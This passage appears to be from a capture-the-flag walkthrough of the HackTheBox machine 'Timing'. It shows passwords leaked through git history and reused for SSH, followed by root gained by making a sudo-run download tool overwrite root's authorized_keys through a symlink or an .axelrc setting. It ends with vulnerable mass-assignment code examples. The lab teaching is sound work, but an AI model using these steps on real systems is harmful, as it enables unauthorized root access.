commit e4e214696159a25c69812571c8214d2bf8736a3f
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:33:54 2021 +0000

    init

```

The second one updates the DB connection. I’ll look at the difference between the two:

```

oxdf@hacky$ git diff e4e214696159a25c69812571c8214d2bf8736a3f 16de2698b5b122c93461298eab730d00273bd83e
diff --git a/db_conn.php b/db_conn.php
index f1c9217..5397ffa 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', 'S3cr3t_unGu3ss4bl3_p422w0Rd');
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');

```

There is another password.

### SSH

That password works for SSH as aaron:

```

oxdf@hacky$ sshpass -p "S3cr3t_unGu3ss4bl3_p422w0Rd" ssh aaron@10.10.11.135
...[snip]...
aaron@timing:~$

```

## Shell as root

### Enumeration

#### sudo

aaron can run `/usr/bin/netutils` as root:

```

aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils

```

#### Common Vs Custom

It’s hard to tell if this is a legit binary because googling for “Linux netutils” returns a lot about the [Netutils package](https://github.com/strizhechenko/netutils-linux). This doesn’t seem to be that.

I’ll take a hash of the file and search that hash in VirusTotal:

```

aaron@timing:~$ md5sum /usr/bin/netutils
28923bb783c151796a1e7fd6c4a6b489  /usr/bin/netutils

```

![image-20220602161808937](https://0xdfimages.gitlab.io/img/image-20220602161808937.png)

This is a good indication that it’s something custom to this box. If I search for any other file in `/usr/bin/`, it is identified. That’s because there are scanners out there that are constantly loading files into VT, so something in a legit distribution is likely to be in VT.

If I try to run it not as root, it complains:

```

aaron@timing:~$ netutils 
Error: Unable to access jarfile /root/netutils.jar

```

This looks like a custom Java Jar file.

In fact, `netutils` itself is just a Bash script calling a Jar file:

```

aaron@timing:~$ cat /usr/bin/netutils 
#! /bin/bash
java -jar /root/netutils.jar

```

### netutils

#### Run netutils

Running it as root presents a menu:

```

aaron@timing:~$ sudo netutils 
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 

```

I am not able to get FTP to work, but if I start `nc` listening on 80, enter my own URL for HTTP, it connects to me:

```

netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.6

```

```

oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.135 40772
GET / HTTP/1.0
Host: 10.10.14.6
Accept: */*
Range: bytes=1-
User-Agent: Axel/2.16.1 (Linux)

```

#### Download File

Some of the attacks I’m going to try won’t work from `/tmp`, `/dev/shm`, or `/var/tmp`. I’ll work from `/home/aaron/.cache` for a bit of OPSEC.

I’ll switch `nc` for a Python HTTP server, and try to get a file that exists:

```

aaron@timing:~/.cache$ sudo netutils 
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.6/0xdf.jpg
Initializing download: http://10.10.14.6/0xdf.jpg
File size: 35 bytes
Opening output file 0xdf.jpg
Server unsupported, starting from scratch with one connection.
Starting download

Downloaded 35 byte in 0 seconds. (0.17 KB/s)

```

There is a hit (actually two) at my server:

```

oxdf@hacky$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.135 - - [02/Jun/2022 20:38:36] "GET /0xdf.jpg HTTP/1.0" 200 -
10.10.11.135 - - [02/Jun/2022 20:38:36] "GET /0xdf.jpg HTTP/1.0" 200 -

```

And the file exists in the current directory, owned by root:

```

aaron@timing:~/.cache$ ls -l
total 4
-rw-r--r-- 1 root  root  35 Jun  2 20:38 0xdf.jpg
-rw-r--r-- 1 aaron aaron  0 Jul 17  2021 motd.legal-displayed

```

### Overwrite authorized\_keys

Given that it tries to save the file at the same file name in the local directory, I’ll create a symlink there pointing to root’s `authorized_keys` file:

```

aaron@timing:~/.cache$ ln -s /root/.ssh/authorized_keys k.pub
aaron@timing:~/.cache$ ls -l
total 4
-rw-r--r-- 1 root  root  35 Jun  2 20:38 0xdf.jpg
lrwxrwxrwx 1 aaron aaron 26 Jun  2 20:39 k.pub -> /root/.ssh/authorized_keys
-rw-r--r-- 1 aaron aaron  0 Jul 17  2021 motd.legal-displayed

```

On my local host, I’ll use my generated SSH public key and save it as `k.pub`.

Now I’ll run again and download `k.pub`:

```

aaron@timing:~/.cache$ sudo netutils 
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.6/k.pub
Initializing download: http://10.10.14.6/k.pub
File size: 96 bytes
Opening output file k.pub.0
Server unsupported, starting from scratch with one connection.
Starting download

Downloaded 96 byte in 0 seconds. (0.47 KB/s)

```

It says it downloaded.

### SSH

With my public key in root’s `authorized_keys` file, I can connect as root over SSH:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.11.135
...[snip]...
root@timing:~# 

```

## Beyond Root

### Alternative Root

#### .rc file

Because this box is Ubuntu 18.04, there’s another trick I can play to get root instead of using a symlink. [The docs](https://github.com/axel-download-accelerator/axel/blob/6046c2a799d82235337e4cba8c4d1fd8c56bc400/doc/axel.txt) for the Axel Download Accelerator show that configurations can be put into `/etc/axelrc` and `~/.axelrc`. The [example](https://github.com/axel-download-accelerator/axel/blob/6046c2a799d82235337e4cba8c4d1fd8c56bc400/doc/axelrc.example#L66-L69) rc file shows this bit:

```

# When downloading a HTTP directory/index page, (like http://localhost/~me/)
# what local filename do we have to store it in?
#
# default_filename = default

```

I’ll set that in aaron’s home directory:

```

aaron@timing:~$ cat .axelrc 
default_filename = /root/.ssh/authorized_keys

```

On my host, I’ll copy my public key into `index.html`, and then run `netutils` on Timing:

```

aaron@timing:~$ sudo netutils 
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.6
Initializing download: http://10.10.14.6
File size: 96 bytes
Opening output file /root/.ssh/authorized_keys
Server unsupported, starting from scratch with one connection.
Starting download

Downloaded 96 byte in 0 seconds. (0.46 KB/s)

```

Now I can SSH as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.11.135
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
...[snip]...
root@timing:~#

```

It’s worth noting that this only works because the directory `/root/.ssh` already exists, but there is no `authorized_keys` file in it. If the file were there, then downloading it would not work. For example, I’ll put some junk in it:

```

root@timing:~# echo "0xdf was here" > .ssh/authorized_keys 

```

If I run the same `netutils` as above, it shows the same success. But with my root shell, I can see it didn’t work:

```

root@timing:~/.ssh# ls -l
total 8
-rw-r--r-- 1 root root 14 Jun  2 23:53 authorized_keys
-rw-r--r-- 1 root root 96 Jun  2 23:54 authorized_keys.0

```

The previous message is still in the file, and the public key is in `authorized_keys.0`.

#### Wait… how?

If you stop and think about this a minute, there’s something that seems off about the above path. If I’m running `netutils` as root, why is it reading `~/axelrc` from `/home/aaron`?

It turns out this only works because the author used Ubuntu 18.04. [This very thorough answer on StackExchange](https://askubuntu.com/a/1187000/367027) explains what’s going on in detail. The top paragraph says:

> For years, Ubuntu has [shipped a patched version of `sudo` that preserves `$HOME` by default](https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/760140). Besides Ubuntu and its derivatives, [very few other operating systems (perhaps no others) do this](https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/1556302/comments/8). It has been [**decided that this causes more problems than it solves**](https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/1556302), and [starting in Ubuntu 19.10](https://bugs.launchpad.net/ubuntu/+source/sudo/+bug/1556302/comments/16), `$HOME` is no longer one of the few environment variables `sudo` preserves.

The `-H` flag in `sudo` requests to set the home directory to the new user:

> ```

>  -H, --set-home
>              Request that the security policy set the HOME environment variable to the home directory specified by the
>              target user's password database entry.  Depending on the policy, this may be the default behavior.
>
> ```

After Ubuntu 19.10, this became the default behavior (just like most other Linux distros). But since this is before that, the `$HOME` variable is not changed.

That means when I run `sudo netutils`, `$HOME` is still `/home/aaron`, and that’s why the `.axelrc` file there is read.

### Mass Assignment Vulnerabilities

#### Background

I didn’t love the author’s implementation of the mass assignment vulnerability, especially in a box where the path involved leaking source code. I wanted to look at how these kinds of vulnerabilities happen, and give a couple examples.

These kind of vulnerabilities are going to show up in an application that defines models, and then the developer can create instances of these models (objects), and update them and save them back to the DB (typically without using any SQL themselves).

Frameworks are getting pretty good at preventing this kind of vulnerability. So even BackendTwo, which uses FastAPI/Pydantic, had to work a bit to make the application vulnerable.

#### BackendTwo

In [BackendTwo](/2022/05/02/htb-backendtwo.html#mass-assignment), there’s an API endpoint to update the user’s profile that sends just the JSON:

```

{
    "profile": "string"
}

```

But I can send more parameters, and it updates them. The source for this endpoint is:

```

@router.put("/{user_id}/edit")
async def edit_profile(*,
    db: Session = Depends(deps.get_db),
    token: User = Depends(deps.parse_token),
    new_user: schemas.user.UserUpdate,
    user_id: int
) -> Any:
    """
    Edit the profile of a user
    """
    u = db.query(User).filter(User.id == token['sub']).first()
    if token['is_superuser'] == True:
        crud.user.update(db=db, db_obj=u, obj_in=new_user)
    else:
        u = db.query(User).filter(User.id == token['sub']).first()
        if u.id == user_id:
            crud.user.update(db=db, db_obj=u, obj_in=new_user)
            return {"result": "true"}
        else:
            raise HTTPException(status_code=400, detail={"result": "false"})

```

This code can be a bit overwhelming, even for someone who is relatively experienced in Python.

This function takes four inputs. We’ll ignore `db` and `token`, as they are loaded elsewhere. `new_user` is of the type `schemas.user.UserUpdate`, which is defined as:

```

class UserUpdate(UserBase):
    is_superuser: bool = Field(1, hidden_from_schema=True)
    guid: Optional[str] = Field(1, hidden_from_schema=True)
    last_update: Optional[int] = Field(1, hidden_from_schema=True)
    time_created: Optional[int] = Field(1, hidden_from_schema=True)
    email: Optional[EmailStr] = Field(1, hidden_from_schema=True)
    profile: str

```

FastAPI will take any POST parameters that match a property of this class and assign them to a new `UserUpdate` object.

The `user_id` input is in the URL, as indicated in `@router.put("/{user_id}/edit")`.

The function then gets a user object from the database, and eventually calls the `user.update` passing in the new object which overwrites parts of the old. This is where mass assignment can happen. The framework is taking all the parameters and assigning them into an object.

#### Timing

Timing doesn’t have any kind of user model. It’s just a dictionary read from the database. Still, it’s possible to imaging a developer not wanting to update all the columns of the user table one by one, and instead doing some kind of loop:

```

foreach($_POST as $key => $value)
{
    if (array_key_exists($key, $user))
    {
        $user[$key] = $value;
    }
}

```

This is looping over the POST parameters, and as long as they are part of the `$user` object, they update it. Then somehow this would get written back into the DB.